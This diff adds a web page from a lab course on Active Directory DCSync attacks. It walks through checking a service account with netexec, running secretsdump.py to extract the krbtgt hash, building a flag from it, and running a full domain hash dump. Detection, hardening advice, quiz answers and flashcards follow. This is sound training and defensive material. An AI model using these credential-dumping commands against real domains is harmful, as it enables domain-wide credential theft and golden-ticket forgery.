+<h3 id="what-secretsdump-dumps">What secretsdump dumps</h3>
+<p>By default, <code>secretsdump.py</code> against a DC returns:
+- <strong>NT hash</strong> of every domain user
+- <strong>LM hash</strong> (usually empty on modern domains)
+- <strong>Kerberos keys</strong> (DES, AES128, AES256)
+- <strong>Supplemental credentials</strong> (clear-text passwords if <code>Store password using reversible encryption</code> is set; rarely used)
+- <strong>Cached credentials</strong> (CACHED_DOMAIN_LOGON_INFO from the local SAM/LSA; not via DRSUAPI but via the same call chain)
+- <strong>Computer account hashes</strong> (every machine secret)</p>
+<p>For this exercise we want only <code>krbtgt</code>. The <code>-just-dc-user krbtgt</code> flag tells secretsdump to use targeted DRSGetNCChanges rather than dumping the entire ntds. Faster, quieter, and yields the exact value we need.</p>
+<hr />
+<h2 id="tool-primer">Tool Primer</h2>
+<h3 id="secretsdump-targeted-user">secretsdump targeted user</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>secretsdump.py<span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span>corp.nordport.local/svc_dcsync_&lt;token&gt;:<span class="s1">&#39;&lt;password&gt;&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;
+</code></pre></div>
+<p>Output:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>[*] Using the DRSUAPI method to get NTDS.DIT secrets
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;32-hex-char NT hash&gt;:::
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>[*] Kerberos keys grabbed
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>krbtgt:aes256-cts-hmac-sha1-96:&lt;aes256-key&gt;
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>krbtgt:aes128-cts-hmac-sha1-96:&lt;aes128-key&gt;
+</code></pre></div>
+<p>The <code>aad3b435b51404eeaad3b435b51404ee</code> LM hash is the canonical "empty LM" sentinel; ignore it. The 32-char NT hash after the third colon is what you want.</p>
+<h3 id="compute-the-flag">Compute the flag</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nv">NTHASH</span><span class="o">=</span><span class="s1">&#39;&lt;32 hex chars from secretsdump&gt;&#39;</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nv">TOKEN</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nv">SHA</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">NTHASH</span><span class="si">}${</span><span class="nv">TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sha256sum<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;OCR{</span><span class="si">${</span><span class="nv">SHA</span><span class="si">}</span><span class="s2">}&quot;</span>
+</code></pre></div>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-validate-the-account">Step 1: Validate the Account</h3>
+<p>Confirm the credential before exercising the rights. A failed authentication here saves you from chasing a permission error in Step 2 (which can look identical to a misconfigured DCSync grant).</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Confirm svc_dcsync_<token> works</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span>corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">  </span>-u<span class="w"> </span><span class="s2">&quot;svc_dcsync_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;password&gt;&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">  </span>-d<span class="w"> </span>corp.nordport.local
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>smb corp-dc01</code></td>
+<td>SMB module against the DC.</td>
+</tr>
+<tr>
+<td><code>-u &lt;user&gt; -p &lt;pw&gt;</code></td>
+<td>Domain credential.</td>
+</tr>
+<tr>
+<td><code>-d &lt;domain&gt;</code></td>
+<td>Domain to authenticate against (DCSync rights live on the domain object).</td>
+</tr>
+</tbody>
+</table>
+<p><code>[+]</code> confirms. <code>[-] STATUS_LOGON_FAILURE</code> means the password is wrong; <code>[+]</code> followed by <code>(Pwn3d!)</code> would mean the account is also a local admin on the DC, which is over-privileged for this scenario.</p>
+</div>
+<h3 id="step-2-extract-krbtgt">Step 2: Extract krbtgt</h3>
+<p><code>secretsdump.py -just-dc-user krbtgt</code> opens a DRSUAPI bind to the DC and calls <code>DRSGetNCChanges</code> requesting only the krbtgt object's secrets. The DC checks the caller's effective rights on the domain object; the two replication ACEs permit the call. The response includes the NT hash, the AES128/256 keys, and any supplemental credentials.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - secretsdump targeted dump</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>secretsdump.py<span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span><span class="s2">&quot;corp.nordport.local/svc_dcsync_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">:&lt;password&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-just-dc-user &lt;user&gt;</code></td>
+<td>Targeted DRSGetNCChanges for one user. Faster + quieter than <code>-just-dc</code>.</td>
+</tr>
+<tr>
+<td><code>&lt;realm&gt;/&lt;user&gt;:&lt;pw&gt;</code></td>
+<td>Authentication string (impacket format).</td>
+</tr>
+<tr>
+<td><code>-dc-ip &lt;ip&gt;</code></td>
+<td>DC IP.</td>
+</tr>
+</tbody>
+</table>
+<p>The output line of interest:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;NT_HASH&gt;:::
+</code></pre></div>
+<p>Field decoding (colon-separated): <code>username:RID:LM_hash:NT_hash:::</code>. The <code>aad3b435b51404eeaad3b435b51404ee</code> is the canonical "empty LM" sentinel; ignore it. The 32-hex-char value after the third colon is what you want. The lines after the user line list the Kerberos AES keys (use those for golden ticket forgery in Exercise 5.4).</p>
+</div>
+<h3 id="step-3-compute-the-flag">Step 3: Compute the Flag</h3>
+<p>The flag is <code>sha256(NT_hash + scope_token)</code> to bind your submission to your token. The <code>echo -n</code> is critical: a trailing newline would change the SHA output.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - SHA-256 the hash + token</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nv">NTHASH</span><span class="o">=</span><span class="s1">&#39;&lt;paste the 32-hex-char NT hash here&gt;&#39;</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nv">TOKEN</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="nv">SHA</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">NTHASH</span><span class="si">}${</span><span class="nv">TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sha256sum<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;OCR{</span><span class="si">${</span><span class="nv">SHA</span><span class="si">}</span><span class="s2">}&quot;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>echo -n</code></td>
+<td>No trailing newline. Critical for hash reproducibility.</td>
+</tr>
+<tr>
+<td><code>sha256sum</code></td>
+<td>SHA-256 the input; output is <code>&lt;hash&gt;  -</code>.</td>
+</tr>
+<tr>
+<td><code>awk '{print $1}'</code></td>
+<td>Print only the hash, not the trailing <code>-</code>.</td>
+</tr>
+</tbody>
+</table>
+<p>Submit the OCR{...} value on the platform.</p>
+</div>
+<h3 id="step-4-note-what-else-you-could-have-dumped">Step 4: Note What Else You Could Have Dumped</h3>
+<p>In a real engagement you would dump everything:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>secretsdump.py<span class="w"> </span>-just-dc<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span><span class="s2">&quot;corp.nordport.local/svc_dcsync_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">:&lt;password&gt;&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">  </span>-dc-ip<span class="w"> </span>&lt;dc_ip&gt;<span class="w"> </span>-outputfile<span class="w"> </span>dump
+</code></pre></div>
+<p><code>dump.ntds</code> would contain every user's hash. From that you can pass-the-hash to anyone, crack offline against rockyou, or forge silver tickets for any service account. The exercise restricts to <code>krbtgt</code> to keep the deliverable focused; the underlying capability is much broader.</p>
+<div class="admonition warning">
+<p class="admonition-title">Common gotchas</p>
+<ul>
+<li><strong><code>STATUS_DRSUAPI_REQUIRED</code></strong>: the account does not have the two replication rights on the domain object. Confirm the grant is current with <code>dsacls "DC=corp,DC=nordport,DC=local" | grep svc_dcsync</code>.</li>
+<li><strong>DRSUAPI bind failure</strong>: secretsdump tries SMB pipe first, then falls back to TCP; some DC firewalls block direct DRSUAPI port. <code>--use-vss</code> is a different-syntax workaround using volume shadow copy (requires SMB admin on the DC).</li>
+<li><strong>Targeting wrong DC</strong>: in multi-DC environments the krbtgt hash is the same everywhere (replication keeps it in sync), but a stale read replica may take minutes to converge after a krbtgt rotation. Re-pull from the PDC if the hash looks suspiciously identical to a known-old value.</li>
+<li><strong>Trailing newline in SHA</strong>: every other shell pipeline trims newlines, but <code>echo</code> (without <code>-n</code>) adds one. Forgetting <code>-n</code> produces a different SHA than the platform expects; the flag is rejected.</li>
+<li><strong>Hash case</strong>: secretsdump prints lowercase hex. The platform accepts case-insensitively, but if you copy-paste into a separate hash tool that is case-sensitive (rare but exists), normalize to lower.</li>
+</ul>
+</div>
+<hr />
+<h2 id="blue-team-perspective">Blue Team Perspective</h2>
+<p>The detection signal lives in event 4662 with the right GUIDs and a non-DC source. Properly configured, this is one of the highest-signal alerts in any AD environment.</p>
+<table>
+<thead>
+<tr>
+<th>Activity</th>
+<th>Event ID</th>
+<th>Field giveaway</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DRSUAPI replication call</td>
+<td>4662</td>
+<td><code>Properties</code> contains <code>1131f6aa</code> or <code>1131f6ad</code></td>
+</tr>
+<tr>
+<td>DRSUAPI from non-DC source</td>
+<td>4662 + 4624</td>
+<td>source IP not on DC list</td>
+</tr>
+<tr>
+<td>Defender for Identity</td>
+<td>"Suspected DCSync attack (replication of directory services)"</td>
+<td>MDI</td>
+</tr>
+<tr>
+<td>Bulk NTDS replication</td>
+<td>many 4662 events in seconds</td>
+<td>DC Security log</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition info">
+<p class="admonition-title">Configuring the SACL for detection</p>
+<p>Default audit policies do not log every 4662; you must add a SACL on the domain object that audits the two replication GUIDs. Once configured, alert on any 4662 with those GUIDs whose source IP is not in the DC list. Cardinality is near zero in normal operation; signal is very high. MDI configures the SACL automatically.</p>
+</div>
+<h2 id="hardening-note">Hardening Note</h2>
+<p>DCSync rights are intentional on a small set of principals and rare to need beyond that. The list below is the realistic audit and hardening menu.</p>
+<div class="admonition tip">
+<p class="admonition-title">DCSync hardening</p>
+<ul>
+<li>Run <code>dsacls "DC=corp,DC=nordport,DC=local" \| findstr /i replicat</code> quarterly. Every principal returned is either on the expected list or a finding.</li>
+<li>BloodHound: <code>MATCH (n)-[:DCSync]-&gt;(d:Domain) RETURN n.name</code>. Any non-Tier-0 result is a finding.</li>
+<li>Move AD Connect / Entra Connect to a Tier-0-classified server with full DC-equivalent monitoring.</li>
+<li>Configure SACL audit on domain object for the two replication GUIDs; forward to SIEM.</li>
+<li>Plan and execute a <strong>krbtgt double rotation</strong> every 6-12 months.</li>
+<li>Enable Defender for Identity for built-in DCSync detection.</li>
+</ul>
+</div>
+<hr />
+<h3 id="record-your-findings">Record Your Findings</h3>
+<blockquote>
+<p><strong>Account used:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>svc_dcsync_&lt;token&gt;
+</code></pre></div>
+<p><strong>krbtgt NT hash:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>(32 hex chars)
+</code></pre></div>
+<p><strong>Flag:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>OCR{&lt;64 hex chars&gt;}
+</code></pre></div>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. The <code>DS-Replication-Get-Changes-All</code> right is granted to Azure AD Connect by design. What is the operational risk of that, and how should it be managed?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Azure AD Connect (now Entra Connect) needs to read every user's password hash to compute the Azure AD password hash sync (PHS) value. The legitimate setup grants the AD Connect service account both DCSync rights on the domain root. The risk: a compromise of the AD Connect service account is a domain-wide credential compromise. Defender controls: (a) install AD Connect on a Tier-0 server, treated as a DC for security purposes; (b) rotate the AD Connect service account password regularly and monitor for use from non-AD-Connect sources; (c) monitor event 4662 for the two replication GUIDs and alert on any source that is not the AD Connect server; (d) consider Pass-Through Authentication (PTA) instead of PHS for environments where the synchronized hashes are not strictly needed. The risk is intrinsic to the architecture; the management is operational discipline.</p>
+</details>
+<p><strong>2. The exercise pulls only krbtgt. Why is krbtgt the highest-value target inside ntds, and what does possession of its hash enable?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>krbtgt is the account that encrypts every TGT in the domain. Its NT hash (or AES key) is the "domain master key" for Kerberos. Possession of krbtgt's hash lets you forge TGTs for any user (golden tickets). Forged TGTs are accepted by every DC and every Kerberos-aware service in the domain because the krbtgt hash is the authentication root of trust. The forgery is undetectable in the tickets themselves: a forged TGT looks like any other valid TGT. The only way to invalidate forged tickets is to rotate krbtgt's password twice (the second rotation discards the previous password, invalidating tickets encrypted with the old key). Most organizations have never rotated krbtgt; a single DCSync of krbtgt yields persistent domain-wide impersonation that survives any user password change.</p>
+</details>
+<p><strong>3. The defender alert is event 4662 with the replication GUIDs from a non-DC source. Why is this not a default alert in most SIEMs?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Event 4662 (Directory Service Access) fires for many directory operations beyond just replication: any object access at the directory layer with auditing enabled. The default Windows audit policy logs 4662 for some operations but not all; turning on full Object Access auditing produces enormous volume (tens of thousands of events per hour on a busy DC). To make replication-specific alerting practical, defenders need to: (a) enable auditing for the specific GUIDs only (<code>auditpol /set</code> with a custom SACL on the domain object), or (b) use a SIEM rule that filters 4662 by the GUID property. Most SIEMs do not ship with this rule pre-built because it requires the customer to also configure the SACL on the domain object. Microsoft Defender for Identity does this automatically and alerts on suspicious DCSync; it is the easiest path for defenders who do not want to build custom rules.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>DCSync needs two rights: <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code>.</li>
+<li><code>secretsdump.py -just-dc-user &lt;user&gt;</code> performs a targeted DRSGetNCChanges call.</li>
+<li>krbtgt is the domain master key; one DCSync = persistent domain compromise.</li>
+<li>Detection: event 4662 with the replication GUIDs from non-DC sources.</li>
+<li>BloodHound shows DCSync paths as <code>DCSync</code> edges; PingCastle and dsacls audit the right grants.</li>
+</ul>
+<h2 id="cheat-sheet-recap">Cheat Sheet Recap</h2>
+<p>The four operations below cover discovery, surgical extraction, and the full domain dump. Use the targeted variant unless you genuinely need everything.</p>
+<table>
+<thead>
+<tr>
+<th>Goal</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Find DCSync principals (BloodHound)</td>
+<td>Cypher: <code>MATCH (n)-[:DCSync]-&gt;(d:Domain) RETURN n.name, d.name</code></td>
+</tr>
+<tr>
+<td>Targeted: pull krbtgt only</td>
+<td><code>secretsdump.py -just-dc-user krbtgt "&lt;domain&gt;/&lt;u&gt;:&lt;pw&gt;" -dc-ip &lt;dc&gt;</code></td>
+</tr>
+<tr>
+<td>Targeted: any specific user</td>
+<td><code>secretsdump.py -just-dc-user "&lt;USER&gt;" "&lt;domain&gt;/&lt;u&gt;:&lt;pw&gt;" -dc-ip &lt;dc&gt;</code></td>
+</tr>
+<tr>
+<td>Full domain hash dump</td>
+<td><code>secretsdump.py -just-dc "&lt;domain&gt;/&lt;u&gt;:&lt;pw&gt;" -dc-ip &lt;dc&gt; -outputfile dump</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="spaced-repetition">Spaced Repetition</h2>
+<p><strong>Card 1: secretsdump Targeted</strong></p>
+<p>Q: Pull only <code>krbtgt</code>'s hash from <code>corp.local</code> DC <code>10.10.10.10</code> using account <code>svc_x:Pass#</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>secretsdump.py<span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span><span class="s2">&quot;corp.local/svc_x:Pass#&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.10
+</code></pre></div>
+<p>Output line: <code>krbtgt:502:aad3b...:NT_HASH:::</code>. The <code>aad3b...</code> is empty LM. The 32 chars after the third colon are your NT hash.</p>
+</details>
+<p><strong>Card 2: DCSync Right GUIDs</strong></p>
+<p>Q: Name the two extended right GUIDs that together enable DCSync.</p>
+<details class="note">
+<summary>Answer</summary>
+<p><code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code> (<code>DS-Replication-Get-Changes</code>) and <code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code> (<code>DS-Replication-Get-Changes-All</code>). Both are required; the "All" variant is the one that exposes secrets. Granted on the domain object by default to Domain Admins, Enterprise Admins, BUILTIN\Administrators, and the Domain Controllers group.</p>
+</details>
+<p><strong>Card 3: Why krbtgt Is the Master Key</strong></p>
+<p>Q: Possession of krbtgt's NT hash enables what attack, and why does rotating user passwords not invalidate the tickets it forges?**</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Golden ticket forgery: forge a TGT for any user with any group membership claims; every DC accepts the forged TGT as authentic because krbtgt's hash is what encrypts every legitimate TGT. User password rotations do not affect krbtgt; the only way to invalidate forged tickets is to rotate krbtgt twice (twice because the previous-and-current password are both honored briefly, and one rotation leaves a window for old-key tickets). Most environments have never rotated krbtgt, so a single DCSync persists indefinitely.</p>
+</details>
+<p><strong>Card 4: Detection Event</strong></p>
+<p>Q: What Windows event ID + GUID combination indicates DCSync, and what additional configuration is needed for the event to fire?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Event 4662 (Directory Service Access) with <code>Properties</code> containing GUID <code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code> or <code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code>. To make it fire reliably, the domain object's SACL must include audit ACEs for those rights. Default audit policies often miss this; the explicit configuration is required. Defender for Identity adds the SACL automatically.</p>
+</details>
+<p><strong>Card 5: Why You Want Just-DC Variants</strong></p>
+<p>Q: Compare <code>secretsdump.py -just-dc</code> vs <code>secretsdump.py</code> (no flag). When do you use each?</p>
+<details class="note">
+<summary>Answer</summary>
+<p><code>-just-dc</code> (and <code>-just-dc-user</code>, <code>-just-dc-ntlm</code>) use DRSUAPI to pull only the requested data, no SAM/LSA dump. Faster, quieter, and works against any reachable DC. Plain <code>secretsdump.py</code> (no flag) ALSO performs an LSA secrets dump from the host you are authenticating as, which requires admin on that host and is loud. Use <code>-just-dc-user krbtgt</code> for surgical extraction. Use <code>-just-dc</code> for the full domain hash dump. Use plain <code>secretsdump.py target</code> only when you also want LSA secrets from the target host (cached domain logon info, machine secret, etc.).</p>
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
